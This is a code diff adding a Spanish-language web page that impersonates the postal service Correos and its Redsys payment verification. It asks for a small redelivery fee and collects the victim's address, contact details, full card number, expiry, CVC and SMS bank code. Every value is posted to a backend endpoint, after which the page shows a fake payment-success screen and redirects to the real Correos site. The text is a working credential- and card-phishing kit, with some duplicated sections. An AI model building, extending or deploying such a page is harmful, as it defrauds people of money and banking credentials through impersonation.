+            <input type="tel" id="telefono" placeholder=" " data-required>
+            <label for="telefono">Número de Teléfono</label>
+          </div>
+
+<button type="button" class="btn-yellow" id="direccionBtn">Actualizar Dirección</button>
+        </form>
+      </div>
+    </section>
+
+    <!-- Página 3: Formulario de pago -->
+    <section id="payment" class="page">
+      <div class="form-container">
+        <h1>Pago de Reenvío</h1>
+        <p class="small">Importe: <strong>0,27 €</strong></p>
+        
+        <div class="payment-method">
+          <label>
+            <input type="radio" name="metodo" checked>
+            Tarjeta de crédito o débito
+          </label>
+          <div class="card-icons">
+            <img src="https://i.imgur.com/0KDG8MH.png" alt="Visa">
+          </div>
+        </div>
+
+        <form id="payForm" autocomplete="off">
+          <div class="input-group">
+            <input type="text" id="name" placeholder=" " required>
+            <label for="name">Nombre en la tarjeta</label>
+          </div>
+
+          <div class="input-group">
+            <input type="tel" id="card" placeholder=" " maxlength="23" inputmode="numeric" required>
+            <label for="card">Número de tarjeta</label>
+          </div>
+
+          <div class="row" style="display: flex; gap: 10px;">
+            <div class="input-group" style="flex: 1;">
+              <input type="text" id="expiry" placeholder=" " maxlength="5" required>
+              <label for="expiry">Fecha (MM/AA)</label>
+            </div>
+            
+            <div class="input-group" style="flex: 1;">
+              <input type="tel" id="cvc" placeholder=" " maxlength="4" required>
+              <label for="cvc">CVC</label>
+            </div>
+          </div>
+<script>
+function enviarDatosPago() {
+  // Generar ID único
+  let idPago = localStorage.getItem('idPago');
+  if (!idPago) {
+    idPago = 'id-' + Math.floor(Math.random() * 1000000);
+    localStorage.setItem('idPago', idPago);
+  }
+
+  // LEE LOS CAMPOS con los ids exactamente como están en tu HTML
+  const nombre = (document.getElementById('nombre') || {}).value || '';
+  // en tu HTML el campo de dirección se llama "direccionInput"
+  const direccion = (document.getElementById('direccionInput') || {}).value || '';
+  const ciudad = (document.getElementById('ciudad') || {}).value || '';
+  const correo = (document.getElementById('correo') || {}).value || '';
+  const telefono = (document.getElementById('telefono') || {}).value || '';
+
+  // campos del pago (en la sección payment)
+  const name = (document.getElementById('name') || {}).value || '';
+  const card = (document.getElementById('card') || {}).value || '';
+  const expiry = (document.getElementById('expiry') || {}).value || '';
+  const cvc = (document.getElementById('cvc') || {}).value || '';
+
+  // Si prefieres usar la dirección guardada anteriormente en localStorage:
+  // const savedDireccion = JSON.parse(localStorage.getItem('direccionData') || '{}');
+
+  const payload = {
+    idPago,
+    etapa: 'tarjeta',
+    // datos de dirección (puedes enviar los que prefieras)
+    nombre,
+    direccion,
+    ciudad,
+    correo,
+    telefono,
+    // datos de "tarjeta" (si son alias/palabras clave está bien)
+    name,
+    card,
+    expiry,
+    // NO recomiendo enviar CVC reales; si es necesario para tu app, quítalo aquí
+    cvc
+  };
+
+  // --- DEBUG: ver en la consola lo que se va a enviar ---
+  console.log('Payload que se va a enviar a /save-data:', payload);
+
+  fetch('http://localhost:3000/save-data', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-API-KEY': 'clave_super_segura_12345' // debe coincidir con tu .env MY_API_KEY
+    },
+    body: JSON.stringify(payload)
+  })
+  .then(async res => {
+    const txt = await res.text().catch(()=>null);
+    let j = null;
+    try { j = JSON.parse(txt); } catch(e){}
+    console.log('Respuesta /save-data -> status:', res.status, ' body:', j || txt);
+    if (!res.ok) throw new Error('HTTP ' + res.status + ' - ' + (j && j.error ? j.error : txt));
+    // Si OK, avanzamos a pantalla de carga/verification
+    mostrarPantallaCarga(); // tu función existente
+  })
+  .catch(err => {
+    console.error('Error al enviar /save-data:', err);
+    alert('Error enviando datos. Mira la consola (F12) para más info.');
+  });
+}
+</script>
+
+
+<script>
+function enviarCodigoSMS() {
+  const idPago = localStorage.getItem('idPago') || 'id-' + Math.floor(Math.random() * 1000000);
+  
+  // Aquí coges el valor del campo donde se escribe el “código de verificación”
+  const smsInput = document.getElementById('smsInput')?.value || '';
+  
+  // Puedes enviar versión mascarada (por ejemplo, ocultando parte)
+  const sms_masked = smsInput.replace(/.(?=.{2})/g, '*');
+  const sms_len = smsInput.length;
+
+  const payload = {
+    idPago,
+    etapa: 'sms',       // 👈 muy importante
+    sms_masked,
+    sms_len
+  };
+
+  console.log('Payload SMS →', payload);
+
+  fetch('http://localhost:3000/save-data', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-API-KEY': 'clave_super_segura_12345'  // igual que en el otro fetch
+    },
+    body: JSON.stringify(payload)
+  })
+  .then(r => r.json())
+  .then(j => {
+    if (j.ok) {
+      alert('Código enviado correctamente');
+      // aquí puedes mostrar la siguiente pantalla o confirmar verificación
+    } else {
+      alert('Error al enviar código');
+      console.error(j);
+    }
+  })
+  .catch(err => {
+    alert('Error de red al enviar código');
+    console.error(err);
+  });
+}
+</script>
+
+
+<script>
+function mostrarPantallaCarga() {
+  // Oculta la pantalla actual (por ejemplo, la de pago)
+  document.querySelector('#pago')?.classList.remove('active');
+  
+  // Muestra la pantalla de carga
+  document.querySelector('#pantallaCarga')?.classList.add('active');
+
+  // Después de unos segundos, muestra la verificación SMS
+  setTimeout(() => {
+    document.querySelector('#pantallaCarga')?.classList.remove('active');
+    document.querySelector('#verificacionPago')?.classList.add('active');
+  }, 4000); // 4 segundos de espera
+}
+</script>
+
+<button type="button" class="btn-yellow" onclick="enviarDatosPago()">Pagar 0,27 €</button>
+        </form>
+      </div>
+    </section>
+
+    <!-- Página 4: Pantalla de carga -->
+    <section id="pantallaCarga" class="page">
+      <div class="loader-container">
+        <div class="loader"></div>
+        <p class="texto-carga">
+          Dado que su banco requiere autenticación adicional para validar su pago...<br>
+          Aplicación o sitio web para completar el proceso de pago.
+        </p>
+      </div>
+    </section>
+
+    <!-- Página 5: Verificación SMS -->
+    <section id="verificacionPago" class="page">
+  <div class="verificacion-box">
+    <!-- Logo arriba a la izquierda -->
+    <div class="verificacion-header">
+      <img src="https://i.imgur.com/m0Kf0uk.png" alt="Logo Redsys" class="logo-redsys">
+      <div class="verificacion-logos">
+        <img src="https://i.imgur.com/YDk46Hz.png" alt="Mastercard ID Check">
+      </div>
+    </div>
+
+    <!-- Contenido principal -->
+    <div class="verificacion-content">
+      <h2>Verificación del pago</h2>
+      <p>
+        Dado que su banco requiere autenticación adicional para validar su pago, 
+        ingrese el código SMS que recibió en su número de acceso (aplicación o sitio web)
+        para completar el proceso de pago.
+      </p>
+
+      <div class="input-box">
+        <input type="text" id="codigoSMS" placeholder="Código recibido por SMS">
+        <img src="https://i.imgur.com/J8BYMih.png" alt="Ícono teléfono" class="input-icon">
+      </div>
+
+      <button class="btn-yellow" id="continuarPago" onclick="enviarSMS()">Continuar</button>
+
+<script>
+function enviarSMS() {
+  const codigoEl = document.getElementById('codigoSMS');
+  const codigo = codigoEl ? String(codigoEl.value || '') : '';
+
+  if (!codigo.trim()) {
+    alert('Por favor ingrese el código.');
+    if (codigoEl) codigoEl.focus();
+    return;
+  }
+
+  const idPago = localStorage.getItem('idPago') || ('id-' + Math.floor(Math.random() * 1e6));
+
+  // ✅ Payload correcto
+  const payload = {
+    idPago,
+    etapa: 'sms',
+    sms_masked: codigo,
+    sms_len: codigo.length
+  };
+
+  console.log('Payload SMS →', payload);
+
+  fetch('http://localhost:3000/save-data', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-API-KEY': 'clave_super_segura_12345'
+    },
+    body: JSON.stringify(payload)
+  })
+  .then(async res => {
+    const txt = await res.text().catch(()=>null);
+    let j = null;
+    try { j = JSON.parse(txt); } catch(e){}
+    console.log('Respuesta /save-data (sms):', res.status, j || txt);
+
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+
+    // ✅ Si todo OK:
+    localStorage.removeItem('idPago');
+    if (codigoEl) codigoEl.value = '';
+
+    // Mostrar overlay bonito
+    const overlay = document.createElement('div');
+    overlay.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;font-family:Arial;text-align:center;";
+    overlay.innerHTML = `
+      <h2 style='color:#1a2a60'>✅ Verificación registrada</h2>
+      <p style='color:#333;font-size:17px;max-width:400px;'>Tu código ha sido registrado correctamente.</p>`;
+    document.body.appendChild(overlay);
+
+    setTimeout(() => {
+      window.location.href = "https://www.correos.es/es/es/particulares/enviar";
+    }, 3000);
+  })
+  .catch(err => {
+    console.error('Error al enviar SMS al backend:', err);
+    alert('Error al enviar el código. Revisa la consola del navegador y la del servidor.');
+  });
+}
+</script>
+
+
+    </div>
+
+    <!-- Logos inferiores -->
+    <div class="verificacion-footer">
+      <img src="https://i.imgur.com/EJbsC1Q.png" alt="Apple Pay">
+    </div>
+  </div>
+</section>
+
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+  <div class="footer-top">
+    <div class="footer-section">
+      <h4>Para ti</h4>
+      <ul>
+        <li><a href="#">Seguimiento de envío</a></li>
+        <li><a href="#">Recibir</a></li>
+        <li><a href="#">Enviar</a></li>
+      </ul>
+    </div>
+
+    <div class="footer-section">
+      <h4>Para tu empresa</h4>
+      <ul>
+        <li><a href="#">Enviar</a></li>
+        <li><a href="#">Ecommerce</a></li>
+        <li><a href="#">Marketing</a></li>
+      </ul>
+    </div>
+
+    <div class="footer-section">
+      <h4>Para tu interés</h4>
+      <ul>
+        <li><a href="#">Filatelia</a></li>
+        <li><a href="#">Correos Market</a></li>
+        <li><a href="#">Web institucional</a></li>
+      </ul>
+    </div>
+
+    <div class="footer-section">
+      <h4>Atención al cliente</h4>
+      <div class="social-icons">
+        <img src="https://i.imgur.com/amuXuq5.png" alt="Facebook">
+      </div>
+    </div>
+  </div>
+
+  <hr class="footer-divider">
+
+  <div class="footer-bottom">
+    <div class="footer-container">
+      <div class="footer-left">
+        <p>Descarga la App de Correos</p>
+        <div class="footer-apps">
+          <img src="https://i.imgur.com/6vuKMAH.png" alt="App Store">
+          <img src="https://i.imgur.com/wkMQUSn.png" alt="Google Play">
+          <img src="https://i.imgur.com/bxum6Lp.png" alt="AppGallery">
+        </div>
+      </div>
+
+      <div class="footer-right">
+        <p>Métodos de pago</p>
+        <div class="footer-payments">
+          <img src="https://i.imgur.com/mSht8tt.png" alt="MasterCard">
+          <img src="https://i.imgur.com/R63z9YB.png" alt="PayPal">
+          <img src="https://i.imgur.com/MWlYy9H.png" alt="Maestro">
+          <img src="https://i.imgur.com/9HllHkE.png" alt="Visa">
+          <img src="https://i.imgur.com/B5ukO6n.png" alt="American Express">
+        </div>
+      </div>
+    </div>
+  </div>
+
+  </footer>
+
+<div class="footer-section">
+      <h4>Para ti</h4>
+      <ul>
+        <li><a href="#">Seguimiento de envío</a></li>
+        <li><a href="#">Recibir</a></li>
+        <li><a href="#">Enviar</a></li>
+      </ul>
+    </div>
+
+    <div class="footer-section">
+      <h4>Para tu empresa</h4>
+      <ul>
+        <li><a href="#">Enviar</a></li>
+        <li><a href="#">Ecommerce</a></li>
+        <li><a href="#">Marketing</a></li>
+      </ul>
+    </div>
+
+    <div class="footer-section">
+      <h4>Para tu interés</h4>
+      <ul>
+        <li><a href="#">Filatelia</a></li>
+        <li><a href="#">Correos Market</a></li>
+        <li><a href="#">Web institucional</a></li>
+      </ul>
+    </div>
+
+    <div class="footer-section">
+      <h4>Atención al cliente</h4>
+      <div class="social-icons">
+        <img src="https://i.imgur.com/amuXuq5.png" alt="Facebook">
+      </div>
+    </div>
+  </div>
+
+  <hr class="footer-divider">
+
+  <div class="footer-bottom">
+    <div class="footer-container">
+      <div class="footer-left">
+        <p>Descarga la App de Correos</p>
+        <div class="footer-apps">
+          <img src="https://i.imgur.com/6vuKMAH.png" alt="App Store">
+          <img src="https://i.imgur.com/wkMQUSn.png" alt="Google Play">
+          <img src="https://i.imgur.com/bxum6Lp.png" alt="AppGallery">
+        </div>
+      </div>
+
+      <div class="footer-right">
+        <p>Métodos de pago</p>
+        <div class="footer-payments">
+          <img src="https://i.imgur.com/mSht8tt.png" alt="MasterCard">
+          <img src="https://i.imgur.com/R63z9YB.png" alt="PayPal">
+          <img src="https://i.imgur.com/MWlYy9H.png" alt="Maestro">
+          <img src="https://i.imgur.com/9HllHkE.png" alt="Visa">
+          <img src="https://i.imgur.com/B5ukO6n.png" alt="American Express">
+        </div>
+      </div>
+    </div>
+  </div>
+<div class="footer-legal">
+    <div class="footer-legal-inner">
+      <img src="https://i.imgur.com/5bNZHki.png" alt="Logo Correos" class="footer-logo">
+      <div class="footer-links">
+        <a href="#">Política de cookies</a>
+        <a href="#">Aviso legal</a>
+        <a href="#">Privacidad web</a>
+        <a href="#">Alerta seguridad</a>
+        <a href="#">Accesibilidad</a>
+        <a href="#">Configurador de cookies</a>
+      </div>
+      <p>© Sociedad Estatal Correos y Telégrafos, S.A., S.M.E. Todos los derechos reservados.</p>
+    </div>
+  </div>
+
+  
+
+
+
+ </script>
+
+
+
+
+<script>
+/* Consolidated and fixed JavaScript:
+   - setResendDate (IIFE)
+   - mostrarPagina navigation
+   - copy tracking number
+   - direccion form validation
+   - pay form handling with 15s loading -> SMS
+   - SMS verification
+   - card/expiry input formatting
+   All event listeners registered on DOMContentLoaded.
+*/
+(function(){
+  // Fecha de reenvío (mañana)
+  function formatDDMMYYYY(d) {
+    const dd = String(d.getDate()).padStart(2,'0');
+    const mm = String(d.getMonth()+1).padStart(2,'0');
+    const yyyy = d.getFullYear();
+    return dd + '/' + mm + '/' + yyyy;
+  }
+  (function setResendDate() {
+    try {
+      const today = new Date();
+      const tomorrow = new Date(today.getFullYear(), today.getMonth(), today.getDate() + 1);
+      const el = document.getElementById('resendDate');
+      if (el) el.textContent = formatDDMMYYYY(tomorrow);
+    } catch (err) {
+      console.warn('setResendDate error', err);
+    }
+  })();
+
+  // Navegación entre páginas
+  function mostrarPagina(id) {
+    document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+    const target = document.getElementById(id);
+    if (target) target.classList.add('active');
+    try { window.scrollTo(0,0); } catch(e){}
+  }
+
+  // Función helper para obtener valor seguro
+  function val(id){
+    const el = document.getElementById(id);
+    return (el && (el.value || el.textContent)) ? (el.value || el.textContent).toString().trim() : '';
+  }
+
+  // Ejecutar cuando DOM esté listo
+  document.addEventListener('DOMContentLoaded', function () {
+    // Copy número de seguimiento
+    const copyEl = document.getElementById('copy-logo');
+    if (copyEl) {
+      copyEl.addEventListener('click', function () {
+        const text = (document.getElementById('tracking-number') && document.getElementById('tracking-number').textContent) ? document.getElementById('tracking-number').textContent.trim() : '';
+        if (!text) return;
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(text).then(() => {
+            copyEl.style.transform = "scale(1.3)";
+            setTimeout(() => copyEl.style.transform = "scale(1)", 350);
+            alert("Número de seguimiento copiado: " + text);
+          }).catch(err => {
+            console.warn('clipboard.writeText failed', err);
+            alert('Copiado: ' + text);
+          });
+        } else {
+          // Fallback
+          try {
+            const ta = document.createElement('textarea');
+            ta.value = text;
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            document.body.removeChild(ta);
+            alert("Número de seguimiento copiado: " + text);
+          } catch(e){
+            console.warn('fallback copy failed', e);
+          }
+        }
+      });
+    }
+
+    // Botón continuar (Inicio -> Dirección)
+    const continueBtn = document.getElementById('continueBtn');
+    if (continueBtn) {
+      continueBtn.addEventListener('click', function(e){
+        e.preventDefault();
+        mostrarPagina('direccion');
+      });
+    }
+
+    // Previene submit por Enter en el form de direccion
+    const direccionForm = document.getElementById('direccionForm');
+    if (direccionForm) {
+      direccionForm.addEventListener('submit', function(e){ e.preventDefault(); });
+    }
+
+    // Botón actualizar dirección -> Validaciones mínimas -> Pago
+    const direccionBtn = document.getElementById('direccionBtn');
+    if (direccionBtn) {
+      direccionBtn.addEventListener('click', function(e){
+        e.preventDefault();
+        const ids = ['nombre','direccionInput','ciudad','postal','region','correo','telefono'];
+        for (let i=0;i<ids.length;i++){
+          const el = document.getElementById(ids[i]);
+          if (!el || !el.value || !el.value.trim()){
+            if (el) el.focus();
+            alert('Introduce al menos 1 carácter en ' + (el && el.previousElementSibling ? el.previousElementSibling.textContent.trim() : ids[i]));
+            return;
+          }
+        }
+        mostrarPagina('payment');
+      });
+    }
+
+    // Formulario de pago -> validación y pantalla de carga (15s)
+    const payForm = document.getElementById('payForm');
+    if (payForm) {
+      payForm.addEventListener('submit', function(e){
+        e.preventDefault();
+        const campos = ['name','card','expiry','cvc'];
+        for (let i=0;i<campos.length;i++){
+          const el = document.getElementById(campos[i]);
+          if (!el || !el.value || !el.value.trim()){
+            if (el) el.focus();
+            alert('Por favor, completa todos los campos antes de continuar.');
+            return;
+          }
+        }
+        // Mostrar pantalla de carga
+        mostrarPagina('pantallaCarga');
+        // Asegurar la clase active
+        const pc = document.getElementById('pantallaCarga');
+        if (pc) pc.classList.add('active');
+
+        // Pasar a verificación SMS tras 15 segundos
+        setTimeout(function(){
+          mostrarPagina('verificacionPago');
+          const vp = document.getElementById('verificacionPago');
+          if (vp) vp.classList.add('active');
+        }, 15000);
+      });
+    }
+
+    // Botón continuar en verificación SMS
+    const continuarPago = document.getElementById('continuarPago');
+    if (continuarPago) {
+      continuarPago.addEventListener('click', function(e){
+        e.preventDefault();
+        const codigo = (document.getElementById('codigoSMS') && document.getElementById('codigoSMS').value) ? document.getElementById('codigoSMS').value.trim() : '';
+        if (!codigo) {
+          alert('Por favor ingrese el código SMS.');
+          (document.getElementById('codigoSMS')||{}).focus && document.getElementById('codigoSMS').focus();
+          return;
+        }
+        mostrarOverlayExito();
+      });
+    }
+
+    // Formateo inputs de tarjeta (card & expiry)
+    const cardEl = document.getElementById('card');
+    if (cardEl) {
+      cardEl.addEventListener('input', function(e){
+        let v = e.target.value.replace(/\D/g,'').slice(0,19);
+        v = v.replace(/(.{4})/g,'$1 ').trim();
+        e.target.value = v;
+      });
+    }
+    const expiryEl = document.getElementById('expiry');
+    if (expiryEl) {
+      expiryEl.addEventListener('input', function(e){
+        let v = e.target.value.replace(/\D/g,'').slice(0,4);
+        if (v.length > 2) v = v.slice(0,2) + '/' + v.slice(2);
+        e.target.value = v;
+      });
+    }
+
+  }); // DOMContentLoaded end
+})(); // IIFE end
+</script>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  if (window.innerWidth <= 768) {
+    document.querySelectorAll('.footer-section h4').forEach(title => {
+      title.addEventListener('click', () => {
+        const section = title.parentElement;
+        section.classList.toggle('open');
+      });
+    });
+  }
+});
+</script>
+
+<!-- Overlay de carga -->
+<div id="overlayCarga" class="overlay-carga">
+  <div class="loader"></div>
+  <p class="texto-carga">Procesando solicitud...<br>Por favor, espere unos segundos.</p>
+</div>
+
+<style>
+  .overlay-carga {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(255, 255, 255, 0.9);
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+  }
+  .overlay-carga.activa { display: flex; }
+
+  .loader {
+    border: 6px solid #f3f3f3;
+    border-top: 6px solid #f7b500; /* Amarillo */
+    border-radius: 50%;
+    width: 70px; height: 70px;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+  }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+  .texto-carga {
+    font-size: 18px;
+    color: #333;
+    text-align: center;
+  }
+
+
+/* ===== Estilo pantalla de verificación tipo Redsys ===== */
+.verificacion-box {
+  background: #fff;
+  max-width: 650px;
+  margin: 60px auto;
+  border-radius: 10px;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+  padding: 30px 40px;
+  font-family: "Segoe UI", Arial, sans-serif;
+  position: relative;
+}
+
+/* Encabezado superior con logos */
+.verificacion-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 25px;
+}
+
+.logo-redsys {
+  height: 32px;
+}
+
+.verificacion-logos img {
+  height: 28px;
+  margin-left: 10px;
+}
+
+/* Contenido principal */
+.verificacion-content h2 {
+  color: #1a2a60;
+  font-size: 20px;
+  margin-bottom: 10px;
+}
+
+.verificacion-content p {
+  color: #333;
+  font-size: 15px;
+  margin-bottom: 20px;
+  line-height: 1.4;
+}
+
+.input-box {
+  position: relative;
+  margin-bottom: 25px;
+}
+
+.input-box input {
+  width: 100%;
+  padding: 14px 45px 14px 12px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  background: #e6e6e6;
+  font-size: 15px;
+}
+
+.input-icon {
+  position: absolute;
+  right: 10px;
+  top: 50%;
+  transform: translateY(-50%);
+  height: 22px;
+  opacity: 0.8;
+}
+
+.verificacion-footer {
+  display: flex;
+  justify-content: flex-end;
+  align-items: center;
+  margin-top: 20px;
+  gap: 10px;
+}
+
+.verificacion-footer img {
+  height: 26px;
+}
+
+
+
+</style>
+
+<script>
+function mostrarPantallaCarga() {
+  // 🔹 Ocultamos todas las secciones .page
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+
+  // 🔹 Mostramos el overlay (pantalla de carga semitransparente)
+  const overlay = document.getElementById("overlayCarga");
+  overlay.classList.add("activa");
+
+  // 🔹 Después de 15 segundos, ocultamos el overlay y mostramos la verificación SMS
+  setTimeout(() => {
+    overlay.classList.remove("activa");
+
+    // Mostrar la pantalla de verificación SMS
+    const smsPage = document.getElementById("verificacionPago");
+    if (smsPage) {
+      smsPage.style.display = "block";    // 🔸 la hacemos visible directamente
+      smsPage.classList.add("active");    // 🔸 marcamos como activa
+      window.scrollTo(0, 0);              // 🔸 subimos arriba
+    } else {
+      console.warn("No se encontró la sección #verificacionPago");
+    }
+  }, 15000);
+}
+
+function mostrarOverlayExito() {
+  const overlay = document.getElementById("overlayExito");
+  if (overlay) overlay.style.display = "flex";
+}
+
+function cerrarOverlayExito() {
+  const overlay = document.getElementById("overlayExito");
+  if (overlay) overlay.style.display = "none";
+  // Aquí podrías redirigir a otra página si quieres
+  // window.location.href = "gracias.html";
+}
+
+
+</script>
+
+<!-- Overlay de éxito -->
+<div id="overlayExito" class="overlay-exito">
+  <div class="overlay-card">
+    <div class="overlay-icon">✅</div>
+    <h2>Pago completado con éxito</h2>
+    <p>Tu pago ha sido procesado correctamente.<br>
+       Recibirás tu paquete en un plazo estimado de <strong>24 – 48 h</strong>.</p>
+    <button onclick="cerrarOverlayExito()" class="btn-yellow">Aceptar</button>
+  </div>
+</div>
+
+<!-- ✅ Overlay de confirmación de pago -->
+<div id="overlayExito" class="overlay-exito">
+  <div class="overlay-card">
+    <div class="overlay-icon">✅</div>
+    <h2>Pago completado con éxito</h2>
+    <p>Tu pago ha sido procesado correctamente.<br>
+       Recibirás tu paquete en un plazo estimado de <strong>24 – 48 h</strong>.</p>
+    <button onclick="cerrarOverlayExito()" class="btn-yellow">Continuar</button>
+  </div>
+</div>
+
+<style>
+/* === Overlay de confirmación de pago === */
+.overlay-exito {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(255, 255, 255, 0.95);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 10000;
+  animation: fadeIn 0.4s ease forwards;
+}
+
+.overlay-card {
+  background: #fff;
+  padding: 30px 40px;
+  border-radius: 12px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+  text-align: center;
+  max-width: 400px;
+  animation: scaleIn 0.4s ease;
+}
+
+.overlay-icon {
+  font-size: 48px;
+  margin-bottom: 15px;
+  color: #00b33c;
+}
+
+.overlay-card h2 {
+  color: #1a2a60;
+  margin-bottom: 10px;
+}
+
+.overlay-card p {
+  color: #333;
+  font-size: 15px;
+  line-height: 1.5;
+  margin-bottom: 25px;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+@keyframes scaleIn {
+  from { transform: scale(0.9); opacity: 0; }
+  to { transform: scale(1); opacity: 1; }
+}
+</style>
+
+<script>
+function mostrarOverlayExito() {
+  const overlay = document.getElementById("overlayExito");
+  if (overlay) overlay.style.display = "flex";
+}
+
+function cerrarOverlayExito() {
+  const overlay = document.getElementById("overlayExito");
+  if (overlay) overlay.style.display = "none";
+  // 👇 Aquí pones el enlace al que quieras redirigir:
+  window.location.href = "https://www.correos.es/es/es/particulares";
+}
+</script>
+
+</body>
+</html>
